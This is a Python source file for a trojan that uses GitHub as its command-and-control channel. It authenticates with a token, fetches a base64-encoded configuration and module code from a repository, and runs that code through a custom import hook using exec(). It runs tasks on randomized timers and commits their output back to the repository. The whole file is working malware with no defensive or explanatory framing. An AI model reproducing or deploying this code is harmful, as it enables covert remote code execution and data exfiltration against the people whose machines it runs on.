import json, base64, sys, time, importlib, random, threading, queue
from github3 import login

trojan_id = "abc"
trojan_config = f"config/{trojan_id}.json"
task_queue = queue.Queue()
configured = False

class GitImporter:
    def __init__(self): self.current_module_code = ""
    def find_module(self, fullname, path=None):
        if configured:
            print(f"[*] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}.py")
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None)
        module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module

def connect_to_github():
    gh = login(token="Token")   # ใช้ token จริงของคุณ
    repo = gh.repository("User-name", "Repo-name")
    branch = repo.branch("master")
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath == filename.path:
            print(f"[*] Found file {filepath}")
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    if not config_json: raise FileNotFoundError(f"[!] Config {trojan_config} not found")
    decoded = base64.b64decode(config_json).decode("utf-8")
    configuration = json.loads(decoded)
    configured = True
    importer = GitImporter()
    for tasks in configuration:
        module_name = tasks["modules"]
        if module_name not in sys.modules and importer.find_module(module_name):
            importer.load_module(module_name)
    return configuration

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = f"data/{trojan_id}/{random.randint(1000, 100000)}.data"
    repo.create_file(remote_path, "Commit message", str(data).encode())

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)

# main loop
sys.meta_path.append(GitImporter())
while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            threading.Thread(target=module_runner, args=(task['modules'],)).start()
            time.sleep(random.randint(1,10))
    time.sleep(random.randint(1000, 10000))
